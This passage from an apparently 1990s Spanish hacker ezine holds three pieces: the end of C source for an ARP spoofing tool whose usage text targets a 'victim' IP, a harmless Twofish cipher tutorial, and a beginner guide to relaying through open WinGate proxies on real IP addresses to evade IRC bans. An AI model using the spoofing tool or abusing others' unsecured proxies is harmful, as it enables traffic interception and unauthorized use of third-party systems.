    for (;(packet = ((u_char *)pcap_next(pd, &pc_hdr)));)
    {
        p = (struct libnet_ethernet_hdr *)(packet);
        if (ntohs(p->ether_type) == ETHERTYPE_ARP)
        {
            a = (struct libnet_arp_hdr *)(packet + ETH_H);
            if (ntohs(a->ar_op) == ARPOP_REPLY)
            {
                ip_p = (u_char *)&ip;
                if (IP_UCHAR_COMP(a->ar_spa, ip_p))
                {
		   printf("Got target hardware address: ");
		   strncpy(joder,hwaddr_to_str(a->ar_sha), 18);
		   for (i = 0; i < 6; i++)
                    {
                        printf("%x", a->ar_sha[i]);
                        if (i != 5)
                        {
                            printf(":");
                        }
                    }
                    printf("\n");
		   libnet_destroy_packet(&buf);
		   return 0;
                }
            }
        }
    }

    libnet_destroy_packet(&buf);
    return (n);
}

/* EOF */

<-->

<++> arp-fun/src/misc.c !74f61a23

#include "arp-fun.h"
void usage(char *name);

void
  usage (char *name)
{
     printf ("\tArp fun %s\t (c) 1999 Ulandron\n", VERSION);
     printf ("Usage:\n\n");
     printf ("%s -d dest_ip\n\n", name);
     printf ("Available arguments.\n");
     printf ("-------------------\n");
     printf ("\t -i interface    Interface to use to send out arp's\n\n");
   
     printf ("\t -s source_ip    Your Ip address; Address to fake\n");
     printf ("\t -d dest_ip      IP address of victim\n");
     printf ("\t -a source_mac   Spoof MAC, if possible (See README)\n");
     printf ("\t -m dest_mac     Destination Mac Address\n\n");
   
     printf ("\t -c count        Number of times to send packet (1-100)\n");
     printf ("\t -v              Verbose mode\n");
     printf ("\t -x seconds      Sleep()  interval between packets\n");
     printf ("\t -V              Prints Version number and exits\n");
     printf ("\t -h              This help\n");
   printf ("\n");
     exit (1);
}
<-->

<++> arp-fun/src/trans.c !765ea8b6


extern unsigned char *str_to_hwaddr (char *str);
extern unsigned int hexstr_to_int (char *cptr);
char * hwaddr_to_str (unsigned char * str);
char * ipaddr_to_str (unsigned char * str);

unsigned char *
  str_to_hwaddr (char *str)
{
   unsigned char tmp[2], strbuf[17], t[2];
   static unsigned char *buf, *tt;
   int e, i;
   
   buf = (unsigned char *) malloc (6);
   bzero (t, 2);
   bzero (tmp, 2);
   bzero (strbuf, 17);
   bzero (buf, 6);
   strncpy (strbuf, str, 17);
   strbuf[17] = '\0';
   tt = buf;
   
   e = 0;
   for (i = 0; i < strlen (strbuf); i++)
     {
	if ((strbuf[i] == ':') && (e == 0))
	  continue;
	tmp[e] = strbuf[i];
	e++;
	if (e == 2)
	  {
	     unsigned int a;
	     a = hexstr_to_int (tmp);
	     memcpy (tt, &a, 1);
	     tt++;
	     bzero (tmp, 2);
	     e = 0;
	  }
     }
   return buf;
}

unsigned int
  hexstr_to_int (char *cptr)
{
   unsigned int i, j = 0;
   
   while (cptr && *cptr && isxdigit (*cptr))
     {
	i = *cptr++ - '0';
	if (9 < i)
	  i -= 7;
	j <<= 4;
	j |= (i & 0x0f);
     }
   return (j);
}

char * hwaddr_to_str (unsigned char * str) {
   static char tmp[20];
   sprintf(tmp,
	   "%02X:%02X:%02X:%02X:%02X:%02X",
	   str[0],str[1],str[2],str[3],str[4],str[5]);
   return tmp;
}

char * ipaddr_to_str (unsigned char * str) {
   static char tmp[20];
   sprintf(tmp,
	   "%u.%u.%u.%u",
	   str[0],str[1],str[2],str[3]);
	   
   return tmp;
}

<-->

9.- Despedida.

Bueno, y esto llega a su fin. Tengo que darle las gracias a ulandron
porque sin el no hubiera sido posible la realizacion de este articulo, thx
ulan ;).
Tambien aprovecho para mandar un saludo a toda la peña de Netsearch, en
especial a dark, gamerx, sp4rk (sigues vivo?), paradigma, y bueno.. a toda
la peña en general :), y otro saludo para la peña del #hacker_novatos ;).
Nos vemos en el siguiente articulo del siguiente numero del NetSearch
Ezine, byes.

Posidon

-------------------

Ha sido un placer trabajar en este tema contigo Posidon, gracias por todo lo
que me has hecho aprender en estos ultimos dias.

Las libnet son una maravilla, sin ellas el programa habria significado el
doble de trabajo y no habria sido ni la mitad de portable.
Sin Stevens y sus Tcp/ip illustrated esto no tendria ninguna gracia. Me
entristece mucho saber que no escribira mas para nosotros.
No quiero nombrar a gente a la que tengo que agradecer cosas porque esto
no acabaria. Ellos saben quienes son y les doy las gracias.

Ulandron

ulandron@undersec.com


=[00100b]=====================================================================
=[Criptografia (y III)]=======================================================
=[por cafo]===================================================================


CRIPTOGRAFIA (y van III) 
======================== 
by cafo 
------- 
 
Aqui volvemos a estar, y sorprendentemente parece que alguien ha seguido los 
articulos! xDDDD. En fin. Lo que sigue ahora es la respuesta a una peticion 
que me han hecho, asi que voy a hacer un analisis pormenorizado del TWOFISH, 
ese algoritmo tan chulo realizado por los chicos de Counterpane (el equipo 
del 'famoso' Bruce Sheiner, http://www.counterpane.com para mas señas). 
 
Como siempre empezare con un poco de historia. 
 
Todos sabemos que el DES es un algoritmo simetrico de cifrado que se impuso 
como estandar en las comunicaciones del gobierno de los E.E.U.U alla por los 
años 70 (para una descripcion del mismo mirate el primer numero del zine). 
El caso es que el año pasado, gracias al avance en tecnicas de computacion 
y al aumento de la potencia de los ordenadores, la EFF consiguio romper el 
DES en menos de dos dias, y por muy poco dinero, con lo que de la noche a la 
mañana el DES paso a ser un sistema inseguro (que mas quieren los de la RSA, 
ya es bastante con que haya durado 20 años ;-). Afortunadamente };-) el 
gobierno presento en 1995 un concurso para para el desarrollo de un nuevo 
algoritmo mas seguro destinado a convertirse en el nuevo estandar de 
comunicaciones. Actualmente (agosto de 1999) se esta en la fase final del 
concurso y se espera que para verano del año que viene se tenga un veredicto 
sobre el ganador. 
 
Bueno, el caso es que el Twofish es uno de los pocos que han llegado a esta 
fase final (creo que han sido cinco en total) y tiene buenas posibilidades 
para llevarse el gato al agua (aunque siempre haya que tener en cuenta que 
la RSA tambien esta de por medio con su propio algoritmo y a los yankis no 
les gusta el 'cambio' en algo de importancia militar como es la criptografia). 
 
Gran parte de la versatilidad de este algoritmo se debe a una perfectamente 
planeada fase preliminar con una delimitacion sobre el papel muy concreta 
acerca de lo que el algoritmo debe hacer. 
 
Estos son los criterios que marca el NIST para el nuevo algoritmo: 
 
        - Debe ser un algoritmo simetrico (evidente ;) de cifrado de bloques 
          de 128 bits. 
        - La longitud de las claves deben ser 128, 196 y 256 bits. 
        - Ser eficiente en un Pentium Pro asi como en diversas plataformas 
          de hardware y software. Esto es especialmente ambiguo por una razon: 
          que los diseñadores se rompan el coco metiendole mas cosas a sus 
          algoritmos, y despues ellos cogen el mas completo };-) 
        - Ser flexible: debe aceptar (con pocos cambios) longitudes extra en 
          las llaves, ser facilmente implementable en otras aplicaciones, 
          posibilidad de convertirse en un encriptador de flujo, etc. 
        - Tener un diseño "simple": para facilitar su analisis por los 
          jueces del concurso y para ser facilmente implementable. 
 
Adicionalmente, los chicos de Counterpane se marcaron unas metas muy 
estrictas para el Twofish: 
 
        - Admitir llaves de cualquier longitud de menos de 256 bits (y no 
          verse limitado a los valores 128 y 196) 
        - Cifrar cada bloque en menos de 500 ciclos de reloj en la version 
          completamente optimizada para Pentium/Pentium Pro/Pentium II 
        - Ser capaz de preprocesar una clave de 128 bits en menos tiempo 
          del que se tarde en cifrar 32 bloques en las mismas arquitecturas 
          que antes. 
        - En caso de no preprocesar la clave, ser capaz de cifrar cada bloque 
          en menos de 5000 ciclos de reloj. 
        - No introducir ninguna instruccion que haga fallar lo anterior en 
          procesadores de 32 bits que no sean de Intel (es decir, no 
          usar instrucciones propias de Intel que los AMD, por ejemplo, no 
          entiendan) 
        - No introducir instrucciones que haga fallar los criterios anteriores 
          en procesadores de 8 o 16 bits (esto ya es mas complicado ;) 
        - No introducir instrucciones que le hagan perder eficiencia en los 
          procesadores de 64 bits en construccion (el Merced, p. ej.) 
        - No introducir elementos que le hagan ineficiente en implementaciones 
          por hardware. 
        - Cifrar datos en menos de 10 milisegundos en un procesador de 8 bits 
          corriente. 
        - Ser implementable en un micro de 8 bits con solo 64 bytes de RAM (!) 
 
Esto con respecto al algoritmo en si. Criptograficamente se impusieron otras 
condiciones: 
 
        - La version de 16 rondas del Twofish debe ser imposible de romper 
          mediante el ataque de texto escogido (que se basa en cifrar muchos 
          textos simples con minimas variaciones hasta dar con la clave) con 
          menos de 2^80 de estos textos y en menos tiempo que 2^N, donde N es 
          la longitud de la clave. 
        - La version de 12 rondas debe ser imposible de romper con menos de 
          2^64 textos y en menos tiempo que 2^N/2, donde N sigue siendo la 
          longitud de la clave. 
 
 Preliminares 
-------------- 
 Antes de empezar con el algoritmo en si, voy a dar unas cuantas definiciones 
 muy usadas en criptografia, pero bastante extrañas para todos aquellos que 
 no esten 'sumergidos' en el mundo de las matematicas. 
 
    - Redes de Feistel: 
      Una red de Feistel es un metodo general para convertir una funcion en 
      en una permutacion. Esta funcion F es siempre no linear (es decir, que 
      aumentar la potencia de calculo en paralelo en el analisis de la funcion 
      apenas tiene consecuencias en el rendimiento del mismo). Matematicamente: 
 
	     F: {0,1}^n/2 x {0,1}^N -> {0,1}^n/2 
 
      donde 'n' es el tamaño de bloque de la red y 'F' es una funcion que 
      toma n/2 bits del bloque y 'N' bits de la clave como entrada, y produce 
      una salida de n/2 bits. 
      En cada ronda de la red, un bloque fuente es la entrada de 'F', y a la  
      salida se le hace un XOR con un bloque destino. Ahora se intercambian 
      las posiciones de fuente y destino y se hace otra ronda con los mismos 
      bloques. En cada ciclo (que son dos rondas) se asegura que todos los  
      bits del bloque de texto han sido modificado por lo menos una vez. 
       
      Concretamente Twofish es una Red de Feistel con 16 rondas por bloque 
      y con una funcion F biyectiva (es decir, con los mismo elementos en el 
      bloque inicial y en el final). 
 
    - S-Boxes (Cajas-S para los hispanohablantes mas puristas :) 
      Una S-Box es una tabla de sustitucion de bits en la que puede variar 
      la longitud de entrada y la de salida. Tambien es no linear y puede 
      estar predefinida o ser generada aleatoriamente. 
 
      Twofish usa cuatro S-Boxes biyectivas de 8 bits dependientes de una 
      clave, que son generadas por una permutacion predefinida de 8 bits 
      efectuada sobre parte de la clave. 
 
    - Matrices MDS. 
      Por definicion "un codigo MDS (Maximun Distance Separable) sobre un  
      campo es un mapeo linear de 'a' elementos del campo hacia 'b' elementos 
      del campo, produciendo un vector compuesto de 'a+b' elementos, con la 
      propiedad de que el numero minimo de elementos distintos de 0 en  
      cualquier vector distinto de 0 es como minimo b+1". Ahora para el 
      resto de los mortales };-) : 
      Si tomamos una matriz MDS la distancia entre dos vectores cualquiera  
      producidos por el mapeo de la matriz es por lo menos b+1. 
      La condicion 'necesaria y suficiente' (lo que me rei en el instituto con 
      esta tonteria ;) para que una matriz de 'AxB' elementos se considere 
      MDS es que todos las submatrices cuadradas producidas por la eliminacion 
      de filas o columnas sean no singulares. 
 
    - Transformaciones Pseudo-Hadamard (PHT, juro que esto suena mucho mejor  
      en ingles :) 
      Estas transformaciones son simples operaciones de mezclado. Dados 
      dos elementos de entrada, 'a' y 'b', la PHT de 32 bits se define como: 
 
	  a' = a + b  mod 2^32 
	  b' = a + 2b mod 2^32 
 
    - Whitening (ocultamiento) 
      Esta tecnica incrementa enormemente la dificultad para descubrir la  
      clave mediante criptoanalisis y es simplemente hacer unas operaciones 
      de XOR a las claves antes de la primera ronda y despues de la ultima. 
      Twofish hace XOR's a los 128 bits de una subclave y otro XOR a los  
      otros 128 bits de la otra. 
 
 
 Empezamos... 
------------- 
 
Antes de nada, una aclaracion de los propios autores. Twofish usa estructuras 
de Feistel en 16 rondas con ocultamiento adicional en la salida y en la  
entrada. El unico elemento que no sigue una estructura de Feistel es la  
rotacion de bits (mas adelantes las veremos); en realidad se podria meter 
estas rotaciones dentro de la funcion F pero esto requeriria una 
rotacion adicional de los bloques justo antes del ocultamiento de la salida. 
 
Veamos rapidamente todo el proceso que sigue el Twofish cuando se trata de  
cifrar (o descifrar) un texto determinado (no os preocupeis si no entendeis  
nada a la primera, esto viene del documento original y ya lo veremos despues ;): 
 
  El bloque de texto plano se divide en 4 words de 32 bits. En el ocultamiento 
  inicial a estos 4 words se les hace un XOR con 4 words de la clave. 
  Despues vienen las 16 rondas de Feistel; en cada una de ellas los dos words 
  de la izquierda se usan como entrada de las funciones 'g' (uno de los dos 
  words se rota 8 bits antes de esto). La funcion 'g' consiste en cuatro 
  S-boxes dependientes de ls clave seguidas de un mezclado de caracter linear 
  utilizando matrices MDS. 
  Los resultados de las dos funciones 'g' se combinan usando unas PHT. Estos 
  dos resultados se combinan mediante XOR con los words de la derecha (uno 
  de los dos words se rota 1 bit a la izquierda al principio y el otro se  
  rota 1 bit a la derecha al final). 
  Despues de todo esto los bloques izquierdo y derecho se intercambian y se 
  inicia otra nueva ronda.  
  Despues de todas las rondas el intercambio de la ultima ronda se rehace y  
  a los cuatro words se les combina mediante XOR con otros cuatro words de  
  la clave produciendo el texto cifrado. 
 
Bonito, verdad?. De aqui podemos aprender dos cosas: que los algoritmos 
suelen ser solamente operaciones sencillas aplicadas cientos de veces para 
que produzcan la mayor entropia posible en el texto cifrado y que los  
redactores del algoritmo original no fueron bendecidos con el don de la 
retorica };-) 
 
Bueno. Como el proposito es que os entereis de lo que se cuece aqui voy a  
saltarme algunas paginas del original y empezaremos con lo serio: 
 
 La funcion F: 
--------------- 
 
Muy impresionante lo de antes, pero la funcion F solo es una permutacion 
dependiente de una clave de 64 bits de longitud. No tiene mucha mas historia. 
Se toman 3 argumentos: dos de los cuatro words del bloque y un numero ('r') que 
nos indica la ronda en la que nos encontramos, por la cosa de variar lo mas 
posible los resultados. Suiguiendo la nomenclatura original, el primer word 
'r0' se pasa a traves de la funcion 'g' y da como salida 't0'; el segundo 
word 'r1' se rota 8 bits a la izquierda y se vuelve a pasar a la funcion 'g' 
para dar como salida 't1'. Estos dos resultados se combinan en una PHT y se 
añaden dos words de la clave expandida, dando 'F0' y 'F1' como resultados 
de la funcion F. Mas o menos asi: 
 
	      t0 = g(r0) 
	      t1 = g(ROL(r1,8)) 
	      F0 = (t0 + t1 + K_2r+8) mod 2^32 
	      F1 = (t0 + 2t1 + K_2r+9) mod 2^32 
 
Pues esto solo tenemos que hacerlo 16 veces, añadir los ocultamientos inicial 
y final y tendremos el bloque cifrado. 
 
 La funcion g 
-------------- 
 
Veamos. Esta funcion toma como argumento un word de 32 bits, verdad?. Pues  
este es dividido en 4 bytes. A cada uno de estos bytes se le crea una S-box 
biyectiva (8 bits de entrada y 8 bits de salida) dependiente y se les hace  
pasar a traves de ellas. Los cuatro resultados que salen se toman como los 
componentes de un vector de longitud 4, al cual se le multiplica con una  
matriz MDS 4x4 (abajo pongo sus valores en hexadecimal). El vector que resulta  
es la salida de 'g'. Vamos a verlo: 
 
	   xi = [X/2^8i] mod 2^8     para i = 0,1,2,3 
	   yi = Si[xi]		     para i = 0,1,2,3 
 
	 / z0 \       / 01 EF 5B 5B \       / y0 \ 
	 | z1 |	      | 5B EF EF 01 |       | y1 | 
	 | z2 |   =   | EF 5B 01 EF |   *   | y2 | 
	 \ z3 /       \ EF 01 EF 5B /       \ y3 / 
	  
Con todo esto, 'Z' es la salida de 'g' y se define como: 
 
       Z = E { zi * 2^8i }  para i=0,1,2,3  (la 'E' es el simbolo de sumatorio) 
 
mientras que 'S' son las S-boxes dependientes que creamos antes. 
 
--------------------------------------- 
| Las transformaciones de las claves. | 
--------------------------------------- 
 
Pasando un poco del orden del original, vamos a tratar las transformaciones, 
expansiones y demas cambios que sufre la clave para todos los procesos en el 
algoritmo. 
 
Twofish esta diseñado para trabajar con longitudes de clave de 128, 196 y 256 
bits. Si os parais a pensar que uno de los objetivos principales del Twofish 
es la flexibilidad para trabajar con diferentes longitudes de clave por debajo 
de ese valor, vereis que la opcion mas facil para solucionarlo (y que por  
supuesto es lo que se hace, lo mas impresionante suele ser lo mas sencillo en  
un diseño };-) es rellenar las claves que no coinciden con esa longitud con 
ceros hasta que alcancen uno de los valores predefinidos. 
 
Bien. Necesitamos generar 40 words K0...K39 (por supuesto expandiendo) y 4 
S-boxes dependientes para usarlas en la funcion 'g' (ver mas abajo). 
 
Lo que hacemos es lo siguiente. Definimos 'k' como N/64 (N es uno de los  
valores predefinidos de la clave: 128, 196 y 256). La clave entera 'M' 
es de 8*k bytes m(0),...,m(8*k-1). Estos bytes primero tienen que ser  
convertidos en un numero de words de 32 bits que viene dado por 2*k: 
 
	     Mi = E { m(4i+j) * 2^8i }    para i=0, ... ,2*k-1 
					  para j=0, ... ,3 
					  ('E' es el simbolo de sumatorio) 
 
Y despues en dos vectores de longitud 'k': 
 
	     Me = { M(0), M(2), ... ,M(2*k-2) } 
	     Mo = { M(1), M(3), ... ,M(2*k-1) } 
 
Tambien necesitamos otro vector de longitud 'k', pero este lo sacamos de otra 
forma. Tomamos los bytes de la clave en grupos de 8 y los multiplicamos 
por una matriz de 4x8 derivado de un sistema Reed-Solomon. Cada resultado 
de 4 bytes forma uno de los words que nos define el tercer vector que nos 
falta (S): 
       
							/ m(8i)   \ 
							| m(8i+1) | 
							| m(8i+2) | 
							| m(8i+3) |	 
       / s(i,0) \       / 01 A4 55 87 5A 58 DB 9E \	| m(8i+4) | 
       | s(i,1) |	| A4 56 82 F3 1E C6 68 E5 |	| m(8i+5) | 
       | s(i,2) |   =   | 02 A1 FC C1 47 AE 3D 19 |  *  | m(8i+6) | 
       \ s(i,3) /	\ A4 55 87 5A 58 DB 9E 03 /	\ m(8i+7) / 
 
 
        
       Si = E { s(i,j) * 2^8i }		para j = 0, ... ,3 
					para i = 0, ... ,k-1 
 
Segun esto, el vector S se define como: 
 
      S = { S(k-1), S(K-2), ... , S(0) } 
 
Con estos 3 vectores ya tenemos todos los elementos necesarios para usar 
una determinada clave en el algoritmo. 
 
 La funcion 'h'. 
----------------- 
 
Esta es la funcion con la que se hace la mayoria de lo que aparece arriba. 
 
 "Toma como entrada un word de 32 bits y una lista de longitud 'k' formada por 
  words de 32 bits { L(0), ... , L(k-1) }. Esta funcion toma un numero de pasos 
  que viene determinado por 'k'.En cada paso los 4 bytes de la entrada se pasan 
  por una S-box predefinida y despues se les hace un XOR con un byte derivado 
  de la lista. Finalmente se vuelven a pasar por otra S-box y se multiplican  
  por una matriz MDS."   
 
Como suele pasar cada vez que pego algo del original, no me entero ni yo ;) 
A ver. Tenemos la lista 'L' y el word 'X' como entrada de la funcion. Lo que 
hacemos es dividir todos estos words en bytes: 
 
	   l(i,j) = [ L/2^8j ] mod 2^8 
	   x(j)	  = [ X/2^8j ] mod 2^8 
 
	   para i = 0, ... , k-1   y   j = 0, ... ,3 
 
y despues las secuencias de sustitucion y los XOR, que dependen de la longitud 
de 'k'. 
 
	   y(k,j) = x(j)	para j = 0, ... ,3 
 
Si 'k' es igual a 4: 
 
	  y(3,0) = Q1 ( y(4,0) )  XOR  l(3,0) 
	  y(3,1) = Q0 ( y(4,1) )  XOR  l(3,1) 
	  y(3,2) = Q0 ( y(4,2) )  XOR  l(3,2) 
	  y(3,3) = Q1 ( y(4,3) )  XOR  l(3,3) 
 
Si 'k' es mayor o igual a 3: 
 
	  y(2,0) = Q1 ( y(3,0) )  XOR  l(2,0) 
	  y(2,1) = Q1 ( y(3,1) )  XOR  l(2,1) 
	  y(2,2) = Q0 ( y(3,2) )  XOR  l(2,2) 
	  y(2,3) = Q0 ( y(3,3) )  XOR  l(2,3) 
 
En todos los casos tenemos que: 
 
	  y(0) = Q1 ( Q0 ( Q0 ( y(2,0) )  XOR  l(1,0) )  XOR  l(0,0)  ) 
	  y(1) = Q0 ( Q0 ( Q1 ( y(2,1) )  XOR  l(1,1) )  XOR  l(0,1)  ) 
	  y(2) = Q1 ( Q1 ( Q0 ( y(2,2) )  XOR  l(1,2) )  XOR  l(0,2)  ) 
	  y(3) = Q0 ( Q1 ( Q1 ( y(2,3) )  XOR  l(1,3) )  XOR  l(0,3)  ) 
 
A que queda bien?. Solo hay que decir que Q1 y Q0 son permutaciones de 8 bits 
que se construyen a partir de cuatro permutaciones de 4 bits cada una: 
tomando el valor de entrada 'x', se define la salida 'y' como 
 
	  a0 = [x/16] 
	  b0 = x mod 16 
	  a1 = a0  XOR  b0 
	  b1 = a1  XOR  ROR-4(b0,1)  XOR  8*a0 mod 16 
	  a2 = t0(a1) 
	  b2 = t1(b1) 
	  a3 = a2  XOR  a3 
	  b3 = a2  XOR  ROR-4(b2,1)  XOR  8*a2 mod 16 
	  a4 = t2(a3) 
	  b4 = t3(b3) 
	   y = 16*b4 + a4 
 
siendo ROR-4 una funcion de rotacion de bits con la particularidad de que los 
rota en grupos de 4. 
Basicamente lo de antes se resume en partir cada byte de entrada en dos trozos, 
mezclar las dos partes, hacerlos pasar por una S-box predefinida, volverlos a 
mezclar, volverlos a pasar por otra S-box y finalmente recombinarlos otra vez 
para formar un byte completo. Concretamente, para Q0 las S-boxes son: 
 
	   t0 = { 8 1 7 D 6 F 3 2 0 B 5 9 E C A 4 } 
	   t1 = { E C B 8 1 2 3 5 F 4 A 6 7 0 9 D } 
	   t2 = { B A 5 E 6 D 9 0 C 8 F 3 2 4 7 1 } 
	   t3 = { D 7 F 4 1 2 6 E 9 B 3 0 8 5 C A } 
 
donde cada entrada esta representada en hexadecimal (recordad que estamos  
trabajando con valores de 4 bits, por lo que con un solo caracter se pueden  
representar todas las combinaciones). Las salidas estan colocadas segun el 
orden de entrada (0, ... 15), es decir, y tomando como ejemplo t0, si los 
4 bits tienen los valores 1110 (15 en decimal, E en hexadecimal) la salida  
seria 1010 (10 en decimal, A en hexadecimal).  
Para Q1 los valores son: 
 
	   t0 = { 2 8 B D F 7 6 E 3 1 9 4 0 A C 5 } 
	   t1 = { 1 E 2 B 4 C 3 7 6 D A 5 F 9 0 8 } 
	   t2 = { 4 C 7 5 1 6 9 A 0 E D 8 2 B 3 F } 
	   t3 = { B 9 5 1 C 3 D E 6 4 7 F 2 0 8 A } 
 
Bueno. Pues basicamente esto es todo. Solo nos falta aclarar algunos elementos 
que me he saltado al explicar las funciones. Veamos: 
 
}*** Las S-boxes dependientes de la funcion 'g'. 
 
Estas son solamente una utilizacion particular de la funcion 'h': 
 
		    g(X) = h(X,S) 
 
Por supuesto, S es realmente s(i) para i = 0,1,2 y 3 que se forman a partir 
de x(i) y y(i) de la funcion 'h' teniendo en cuenta que, en este caso, la  
lista 'L' es igual que el vector S derivado de la clave (ver el apartado 
de las transformaciones de las claves). 
 
}*** La clave expandida. 
 
Os acordais de esos 40 words (K0, ... ,K39) de los que hablabamos antes?. 
Pues estos tambien se sacan de la funcion 'h' (la de cosas que se pueden  
llegar a sacar de aqui ;) : 
 
	       p = 2^24 + 2^16 + 2^8 + 2^0 
	       Ai = h(2ip, Me) 
	       Bi = ROL( h((2i+1)p,Mo ), 8 ) 
	       K2i = (Ai + Bi) mod 2^32 
	       K2i+1 = ROL( (Ai + 2Bi) mod 2^32, 9) 
 
La constante 'p' se usa porque tiene una cualidad particular: para  
i=0,...255 el word 'ip' se queda formado por cuatro bytes iguales del mismo 
valor que 'i'.  
 
Ufff. Pues esto ya esta listo. Ahora si quieres enterarte de algo, mejor te  
lo lees desde el principio y no te quedes con dudas sin preguntar si me ves 
por ahi };-).  
 
Bueno, ya en serio. Como lo que queria era mostrar como funciona el Twofish 
no he empezado a engordar el articulo con analisis mas o menos sesudos (que 
exsten por ahi) sobre el criptoanalisis, las claves inseguras y las filosofias 
de diseño; si quieres algo de eso ya sabes:  
 
   http://www.counterpane.com/twofish.html 
 
Y se acabo. Posiblemente ya no nos leeremos hasta dentro de un par 
de numeros (si todavia existimos, claro: nos vamos acercando al limite de 
numeros al que llegan los ezines de por aqui X-D) asi que si quereis algo,  
ya sabeis: 
 
   encmesiah@bigfoot.com 
 
un saludete. 
cafo


=[00101b]=====================================================================
=[Ocultacion de IPs]==========================================================
=[por Aule]===================================================================


Este texto es una explicacion para novatos(abstenerse gurus)de diversos
terminos y tecnicas que nos sirven para ocultar nuestra direccion ip


1. Introduccion
2. Proxys
3. Wingates
4. Bouncer
5. IP-Spoofing


1- Introduccion
Seguro que habeis oido hablar o leido en algun texto cosas como un Bouncer
un Wingate o un Proxy pero es facil que no lo tengais muy claro o que
tengais alguna duda, porque estos terminos se confunden bastante amenudo
Antes de empezar quiero que entendais lo que realmente significa ocultar
vuestra IP. Pues bien en internet vuestra IP es lo mismo que en la vida real
pueden ser tus huellas dactilares, tu DNI o codigo genetico, sin estos datos
podrias hacer "todo" lo que quisieras. Si lo piensas podrias decir que eres
"invisible", pues en internet lo mismo, si "no tienes IP" eres un ordenador
fantasma

2- Proxys
Bien voy explicar lo que es un Proxy solo para los mas novatos porque
cualquiera que lea esto creo que ya lo tendria que saber :-P
Cuando hablamos de una red siempre pensamos en un grupo mas o menos grande
de ordenadores conectados entre si, pero esto no funciona solamente asi
tiene que tener una determinada estructura, necesita lo que se llama un
servidor, que no es otra cosa que una maquina con unas mejores
prestaciones(aunque no siempre sea asi) y que usa un sistema operativo con
distintos usuarios

                (server)       |------ equipo B
                equipo A ------|------ equipo C
                               |------ equipo D
                               |------ equipo E

Bien pues cuando nuestra red necesita tener salida al exterior, ya sea a
otra red local o a internet, decimos que es un servidor Proxy, todos los
datos que lleguen de fuera de nuestra red tienen que pasar por esta maquina
su funcion entonces seria la de un router(esto no es asi exactamente, que
no me mate nadie xD), es entonces cuando tienen utilidad palabras como
wingate o bouncer
Existen muchos tipos de servidores proxy, sin ir mas lejos vuestro proveedor
de internet funciona como un server proxy y vosotros formais parte de su red,
solo que a diferencia de una peque¤a red local, el server de vuestro ISP
tiene que asignar una ip distinta cada vez que accedeis a el(entre otras
diferencias).En una red local (LAN) las ips suelen estar predefinidas.

3- Wingates
Wingate es un programa que funciona en Win 95/98 y NT. Este programa lo usan
los servers proxys para dirigir el trafico circula por una red local es lo
que hace que realice funciones similares a un router
Realmente todo el software que hace estas funciones es conocido con el
nombre de wingate pero existen muchos programas que realizan esta funcion
cada uno con su propio nombre pero el mas comun es el que realmente se llama
wingate (mas adelante explicare como diferenciar los distintos wingates)
Bien pues estos programas no es que sean muy dificiles de configurar pero
amenudo los admis se dejan muchas puertas abiertas que el programa trae por
defecto, sobre todo las versiones mas antiguas y sin parchear, las cuales
permiten acceso telnet al puerto 23 sin pedir pass (jejeje :))
Con estos datos podemos usar el wingate para muchas cosas... cada uno...
Podemos acceder al IRC para lo que solo necesitamos algunos comandos del
mIRC
	
	1) /server wiley231h038.roadrunner.nf.net 23
	WinGate>NICK Aule
	Connecting to host NICK...Host name lookup for 'NICK' failed
	USER aule "pss" "wiley231h038.roadrunner.nf.net" The truth is out there...
	Connecting to host USER aule "pss" "wiley231h038.roadrunner.nf.net"
        ...Host name lookup for 'USER aule "pss"
        "wiley231h038.roadrunner.nf.net" ' failed
        
        2) /raw dubhe.irc-hispano.org 6667
        -> Server: dubhe.irc-hispano.org 6667
        Connecting to host dubhe.irc-hispano.org...Connected
	
        3) /raw nick Aule

	-> Server: nick Aule

	PING? PONG!

	4) /raw user taigual kemasda el@mio.com ikepasa

	-> Server: user taigual kemasda el@mio.com ikepasa

	Welcome to the Internet Relay Network Aule
	Your host is dubhe.irc-hispano.org[dubhe.acn.es], running version
	This server was created Mon Aug 16 1999 at 00:57:47 EDT
	dubhe.irc-hispano.org u2.10.06.24.(nullchan) dioswkg biklmnopstv

Bueno y ya tamos dentro del irc usando un wingate :) tambien se puede usar
el comando QUOTE en lugar de RAW y los puntos 3 y 4 pueden ir en orden
contrario. Si te sientes intrigado por que es lo que has hecho hazte un
whois y seguro que lo comprenderas.
Tambien existen lo que son los socks que permiten el acceso al IRC atraves
de la maquina Wingate pero por el puerto 1080. Con del mIRC su uso es de lo
mas sencillo no tienes mas que indicarle al mIRC que usas a la maquina con
el Wingate como un firewall y el puerto que usas para acceder a el, el 1080.
Esto se hace en la ventana del setup del mIRC en la pesta¤a que pone
firewall, hay distintas casillas, en la del host ponemos la direccion del
Wingate, puerto 1080 que ya viene por defecto, y pulsamos los socks,bueno...
y conectar con el server de IRC como haces siempre. La diferencia de
hacerlo asi es que si realizamos un DCC con otro usuario este va conocer
nuestra autentica IP
Si eres un poco inteligente entenderas que con esto te puedes saltar cosas
como un G-LINE y un KILL o bans en canales donde no te has portado bien :P
Ademas si alguien te esta intentando nukear lo tiene mucho mas dificil
porque intentara nukear al server del wingate no tu ordenador.
Decir por ultimo del wingate en el IRC, que en la red hispano.org el uso de
wingates esta en vias de extincion :(( pero esto no es el tema de este txt
Bueno sigamos con nuestro amigo Wingate como dije antes el programa habre el
puerto 23 y permite acceder a el sin pedirnos pass, con lo cual lo podemos
usar para saltar a otras maquinas. Esto es lo que seria hacer Bouncing pero
lo explico en este apartado por que es atraves de un wingate.
Como dije antes no todos los Proxys usan el mismo software, existen
distintos programas que usan estos servers cada uno tiene sus propios fallos
de seguridad, pero vamos a diferenciar que tipo de soft se trata:

	- Winproxy
	realizamos un telnet al server

	---------------------------------------------------
	Trying 195.76.206.157...
	Connected to 195.76.206.157.
	Escape character is '^]'. 
	Enter : <host> [port] :
	----------------------------------------------------

	para estar seguros conectamos al ftp (puerto 21)

	------------------------------------------------------
	Connected to 195.76.206.157.
	220 WinProxy FTP Gateway ready, enter username@host[:port]
	----------------------------------------------------- 

	esta claro que es un winproxy

	- Wingate
	Esta claro el conocido Wingate :)
	Las ultimas versiones vienen parcheadas para que no se pueda
	acceder desde el exterior
	Realizamos un telnet y vemos clarito el prompt

	---------------------------------------------------
	Trying 195.76.206.62...
	Connected to 195.76.206.62.
	Escape character is '^]'.
	WinGate>
	---------------------------------------------------
	
	FTP

	------------------------------------------------------
	Connected to 195.76.206.62.
	220 WinGate V1.3 FTP Gateway ready, enter user@host[:port]
	------------------------------------------------------

	sed buenos.... si podeis :P

	- S-Proxy
	Este es soft espa¤ol!
	Telnet

	----------------------------------------------------
	Trying 194.75.196.77...
	Connected to 194.75.196.77.
